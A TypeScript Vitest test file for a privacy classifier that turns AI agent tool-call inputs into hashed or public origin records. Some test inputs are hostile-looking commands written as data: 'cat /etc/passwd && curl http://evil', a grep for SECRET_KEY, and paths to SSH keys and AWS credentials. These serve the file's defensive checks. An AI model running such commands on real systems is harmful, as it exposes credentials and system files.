import { describe, it, expect } from 'vitest';
import {
  resolvableOrigin, privateOrigin, resolvableDraft, privateDraft, stampWitness,
  urlDrafts, urlOrigins, toolInputOriginDrafts, artifactScanOrigins, mergeInputOrigins,
  observerDeviceWitness, domainOf,
  WITNESS_OBSERVER_DEVICE, PRIVATE_FILE, PRIVATE_URL_PATH, PRIVATE_HOST,
} from './origin-capture';

const OBS = { type: WITNESS_OBSERVER_DEVICE, identity: 'dev_abc', attestation_tier: 'software' };

describe('origin-capture — privacy classifier + builders (Prompt 2)', () => {
  it('resolvableOrigin records the identifier IN THE CLEAR + a sha256 hash of it', () => {
    const o = resolvableOrigin('domain:example.com', OBS);
    expect(o.origin_identifier).toBe('domain:example.com');
    expect(o.hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(o.witnessed).toBe(true);
    expect(o.witness).toEqual(OBS);
  });

  it('privateOrigin puts ONLY a type tag in origin_identifier; the raw value lives ONLY in the hash', () => {
    const secretPath = '/Users/frank/secret-client/project/auth.ts';
    const o = privateOrigin(PRIVATE_FILE, secretPath, OBS);
    expect(o.origin_identifier).toBe(PRIVATE_FILE);
    // THE PRIVACY INVARIANT: the raw path never appears in the clear.
    expect(o.origin_identifier).not.toContain('frank');
    expect(o.origin_identifier).not.toContain('secret-client');
    expect(o.origin_identifier).not.toContain('/');
    expect(o.hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    // And the hash is NOT the hash of the tag — it is the hash of the raw value.
    expect(o.hash).not.toBe(privateOrigin(PRIVATE_FILE, 'other', OBS).hash);
  });

  it('urlOrigins splits a URL into a resolvable domain and a PRIVATE path (no plaintext path)', () => {
    const url = 'https://internal.corp.example/secret/endpoint?token=abc123';
    const os = urlOrigins(url, OBS);
    expect(os[0].origin_identifier).toBe('domain:internal.corp.example');
    expect(os[0].witnessed).toBe(true);
    expect(os[1].origin_identifier).toBe(PRIVATE_URL_PATH);
    // RED-adjacent privacy assertion: neither the path nor the query token leaks.
    for (const o of os) {
      expect(o.origin_identifier).not.toContain('secret');
      expect(o.origin_identifier).not.toContain('token');
      expect(o.origin_identifier).not.toContain('abc123');
    }
  });

  it('a root-only URL yields ONLY the domain origin (no empty private path entry)', () => {
    const os = urlOrigins('https://example.com/', OBS);
    expect(os).toHaveLength(1);
    expect(os[0].origin_identifier).toBe('domain:example.com');
  });

  it('domainOf rejects non-http(s) and unparseable', () => {
    expect(domainOf('ftp://x/y')).toBeNull();
    expect(domainOf('not a url')).toBeNull();
    expect(domainOf('https://ok.test/a')).toBe('ok.test');
  });

  describe('toolInputOriginDrafts — the transcript allowlist (privacy-critical)', () => {
    it('Read tool → a private_file draft whose raw path is ONLY in the hash', () => {
      const drafts = toolInputOriginDrafts('Read', { file_path: '/home/me/.ssh/config' });
      expect(drafts).toHaveLength(1);
      expect(drafts[0].origin_identifier).toBe(PRIVATE_FILE);
      expect(drafts[0].origin_identifier).not.toContain('.ssh');
      expect(drafts[0].hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    });

    it('WebFetch tool → domain resolvable + path private', () => {
      const drafts = toolInputOriginDrafts('WebFetch', { url: 'https://api.x.test/v1/secret?k=1' });
      expect(drafts[0].origin_identifier).toBe('domain:api.x.test');
      expect(drafts[1].origin_identifier).toBe(PRIVATE_URL_PATH);
    });

    // OpenClaw (Atlas's harness) names the file-read tool `read` with arg `path`
    // (Claude Code uses `Read` + `file_path`). The lowercased name matches the
    // file-tool set and `path` is read, so an agent-device transcript turn that
    // reads a file yields a private_file origin (hash-only) just like Claude Code.
    it('OpenClaw read tool (arg `path`) → a private_file draft, path ONLY in the hash', () => {
      const drafts = toolInputOriginDrafts('read', { path: '/home/atlas/.ssh/id_ed25519', limit: 200 });
      expect(drafts).toHaveLength(1);
      expect(drafts[0].origin_identifier).toBe(PRIVATE_FILE);
      expect(drafts[0].origin_identifier).not.toContain('.ssh');
      expect(drafts[0].hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    });

    // RED CONTROL: Bash / OpenClaw `exec` / Grep / Glob args are the most sensitive
    // and are NEVER read — they contribute ZERO origins. Critically, `path` is read
    // ONLY under a file-tool NAME: a non-file tool carrying a `path` (Grep, OpenClaw
    // `exec`/`process`) contributes nothing. If the allowlist ever widened to read
    // these, this goes red.
    it('RED: Bash / exec / Grep / unknown tools contribute NO origins (allowlist holds)', () => {
      expect(toolInputOriginDrafts('Bash', { command: 'cat /etc/passwd && curl http://evil' })).toEqual([]);
      expect(toolInputOriginDrafts('exec', { command: 'cat /etc/passwd', workdir: '/srv', path: '/etc/passwd' })).toEqual([]);
      expect(toolInputOriginDrafts('Grep', { pattern: 'SECRET_KEY', path: '/srv' })).toEqual([]);
      expect(toolInputOriginDrafts('process', { action: 'kill', path: '/x' })).toEqual([]);
      expect(toolInputOriginDrafts('SomeFutureTool', { file_path: '/x' })).toEqual([]);
    });

    it('non-object / null input → no origins, never throws', () => {
      expect(toolInputOriginDrafts('Read', null)).toEqual([]);
      expect(toolInputOriginDrafts('Read', 'a string')).toEqual([]);
    });

    //, five classes — a SIGNED catalog teaches the arg
    // names of a harness Provian shipped no code for. The rules route into the
    // five privacy-safe classes: file/host hash-only, url/package/repo per rule.
    describe('catalog arg rules (close, five classes) — additive, still privacy-safe', () => {
      it('a catalog `file` rule captures a NEW harness tool arg as a private_file (hash-only)', () => {
        const drafts = toolInputOriginDrafts(
          'nano-agent',
          { target_path: '/home/atlas/.aws/credentials' },
          [{ tools: ['nano-agent'], key: 'target_path', class: 'file' }],
        );
        expect(drafts).toHaveLength(1);
        expect(drafts[0].origin_identifier).toBe(PRIVATE_FILE);
        expect(drafts[0].hash).toMatch(/^sha256:[0-9a-f]{64}$/);
      });

      it('a catalog `url` rule → domain resolvable + path private', () => {
        const drafts = toolInputOriginDrafts(
          'nano-agent-fetch',
          { endpoint: 'https://api.corp.test/v2/secret?token=abc' },
          [{ tools: ['nano-agent-fetch'], key: 'endpoint', class: 'url' }],
        );
        expect(drafts[0].origin_identifier).toBe('domain:api.corp.test');
        expect(drafts[1].origin_identifier).toBe(PRIVATE_URL_PATH);
      });

      it('a catalog `host` rule → private_host, hash only (the bare host never resolves)', () => {
        const drafts = toolInputOriginDrafts(
          'nano-agent', { server: 'db-01.internal.corp' },
          [{ tools: ['nano-agent'], key: 'server', class: 'host' }],
        );
        expect(drafts).toHaveLength(1);
        expect(drafts[0].origin_identifier).toBe(PRIVATE_HOST);
        expect(drafts[0].hash).toMatch(/^sha256:[0-9a-f]{64}$/);
        // The internal host is a private fact — it is in the hash, never the identifier.
        expect(drafts[0].origin_identifier).not.toContain('internal');
        expect(JSON.stringify(drafts)).not.toContain('db-01.internal.corp');
      });

      it('a catalog `package` rule → a resolvable pkg: coordinate in the clear', () => {
        const drafts = toolInputOriginDrafts(
          'nano-agent', { dep: 'npm:@scope/lib@1.2.3' },
          [{ tools: ['nano-agent'], key: 'dep', class: 'package' }],
        );
        expect(drafts).toHaveLength(1);
        expect(drafts[0].origin_identifier).toBe('pkg:npm:@scope/lib@1.2.3');
      });

      it('a catalog `repo` rule → repo: for a coordinate, commit: for a 40-hex sha', () => {
        const repoDrafts = toolInputOriginDrafts(
          'nano-agent', { source: 'provian/wallet' },
          [{ tools: ['nano-agent'], key: 'source', class: 'repo' }],
        );
        expect(repoDrafts[0].origin_identifier).toBe('repo:provian/wallet');
        const commitDrafts = toolInputOriginDrafts(
          'nano-agent', { source: '0123456789ABCDEF0123456789abcdef01234567' },
          [{ tools: ['nano-agent'], key: 'source', class: 'repo' }],
        );
        expect(commitDrafts[0].origin_identifier).toBe('commit:0123456789abcdef0123456789abcdef01234567');
      });

      it('defense-in-depth — an unrecognized class yields NO draft (never plaintext)', () => {
        // A rule that bypassed catalog sanitization with an unknown class must
        // still emit nothing rather than leak the value.
        const drafts = toolInputOriginDrafts(
          'nano-agent', { secret: 'do-not-emit-this' },
          [{ tools: ['nano-agent'], key: 'secret', class: 'plaintext' as never }],
        );
        expect(drafts).toEqual([]);
        expect(JSON.stringify(drafts)).not.toContain('do-not-emit-this');
      });

      it('THE PRIVACY CONTROL — the plaintext value NEVER reaches origin_identifier under a catalog rule', () => {
        const secret = '/home/atlas/.aws/credentials';
        const drafts = toolInputOriginDrafts(
          'nano-agent', { target_path: secret },
          [{ tools: ['nano-agent'], key: 'target_path', class: 'file' }],
        );
        for (const d of drafts) {
          expect(d.origin_identifier).not.toContain('credentials');
          expect(d.origin_identifier).not.toContain('.aws');
        }
        expect(JSON.stringify(drafts)).not.toContain(secret);
      });

      // RED CONTROL: the rule is what did it. Without the rule, the same
      // uncataloged tool contributes ZERO — so a green above cannot be the
      // built-in allowlist quietly matching, and a broken rule path goes red here.
      it('RED: WITHOUT the rule, the same uncataloged tool + arg yields nothing', () => {
        expect(toolInputOriginDrafts('nano-agent', { target_path: '/home/atlas/.aws/credentials' }))
          .toEqual([]);
      });

      it('a rule for a DIFFERENT tool does not fire on this call', () => {
        expect(toolInputOriginDrafts(
          'nano-agent', { target_path: '/x' },
          [{ tools: ['other-tool'], key: 'target_path', class: 'file' }],
        )).toEqual([]);
      });

      it('a non-string arg value under a rule contributes nothing (no throw)', () => {
        expect(toolInputOriginDrafts(
          'nano-agent', { target_path: { nested: true } },
          [{ tools: ['nano-agent'], key: 'target_path', class: 'file' }],
        )).toEqual([]);
      });

      it('dedups against the built-in allowlist — a rule that restates Read/file_path does not double-emit', () => {
        const drafts = toolInputOriginDrafts(
          'Read', { file_path: '/home/me/.ssh/config' },
          [{ tools: ['read'], key: 'file_path', class: 'file' }],
        );
        expect(drafts).toHaveLength(1);
        expect(drafts[0].origin_identifier).toBe(PRIVATE_FILE);
      });
    });
  });

  describe('artifactScanOrigins — witnessed:false, public identifiers only', () => {
    it('finds DOIs, addresses, domains, commit shas and marks them witnessed:false', () => {
      const text = 'see 10.1000/xyz123 and 0xABCDEF0123456789abcdef0123456789ABCDEF01 at https://zenodo.org/record/1 '
        + 'rebased onto 0123456789abcdef0123456789abcdef01234567';
      const os = artifactScanOrigins(text);
      const ids = os.map((o) => o.origin_identifier);
      expect(ids).toContain('doi:10.1000/xyz123');
      expect(ids).toContain('evm:0xabcdef0123456789abcdef0123456789abcdef01');
      expect(ids).toContain('domain:zenodo.org');
      expect(ids).toContain('commit:0123456789abcdef0123456789abcdef01234567');
      expect(os.every((o) => o.witnessed === false)).toBe(true);
      expect(os.every((o) => o.witness === undefined)).toBe(true);
    });

    it('RED: empty / non-string input yields nothing (no vacuous pass)', () => {
      expect(artifactScanOrigins('')).toEqual([]);
      expect(artifactScanOrigins('nothing identifying here')).toEqual([]);
    });
  });

  describe('mergeInputOrigins — the order-independence union', () => {
    it('dedups by (identifier, hash) and prefers the witnessed-true variant', () => {
      const unwit = resolvableOrigin('commit:abc', null);
      const wit = resolvableOrigin('commit:abc', OBS);
      const merged = mergeInputOrigins([unwit], [wit]);
      expect(merged).toHaveLength(1);
      expect(merged[0].witnessed).toBe(true);
    });

    it('unions distinct origins and caps at 64', () => {
      const a = Array.from({ length: 40 }, (_, i) => resolvableOrigin(`domain:a${i}.test`, OBS));
      const b = Array.from({ length: 40 }, (_, i) => resolvableOrigin(`domain:b${i}.test`, OBS));
      expect(mergeInputOrigins(a, b)).toHaveLength(64);
    });

    it('handles null inputs', () => {
      expect(mergeInputOrigins(null, null)).toEqual([]);
      expect(mergeInputOrigins([resolvableOrigin('doi:1', OBS)], undefined)).toHaveLength(1);
    });
  });

  describe('stampWitness / drafts', () => {
    it('a draft carries no witnessed field; stampWitness adds it', () => {
      const d = resolvableDraft('domain:x.test');
      expect('witnessed' in d).toBe(false);
      expect(stampWitness(d, OBS).witnessed).toBe(true);
      expect(stampWitness(d, null).witnessed).toBe(false);
      expect(stampWitness(d, null).witness).toBeUndefined();
    });

    it('privateDraft hashes the raw value but exposes only the tag', () => {
      const d = privateDraft(PRIVATE_FILE, '/secret');
      expect(d.origin_identifier).toBe(PRIVATE_FILE);
      expect(d.hash).toMatch(/^sha256:[0-9a-f]{64}$/);
    });
  });

  describe('observerDeviceWitness — best-effort tier', () => {
    it('returns null with no device id (honest unwitnessed fallback)', () => {
      expect(observerDeviceWitness(null, 'human', 'secure_enclave_p256')).toBeNull();
    });
    it('human + secure_enclave → hardware_partial', () => {
      const w = observerDeviceWitness('dev_1', 'human', 'secure_enclave_p256');
      expect(w).toEqual({ type: WITNESS_OBSERVER_DEVICE, identity: 'dev_1', attestation_tier: 'hardware_partial' });
    });
    it('agent device → software (forced), even with a hardware signing method', () => {
      const w = observerDeviceWitness('dev_2', 'agent', 'secure_enclave_p256');
      expect(w?.attestation_tier).toBe('software');
    });
  });
});
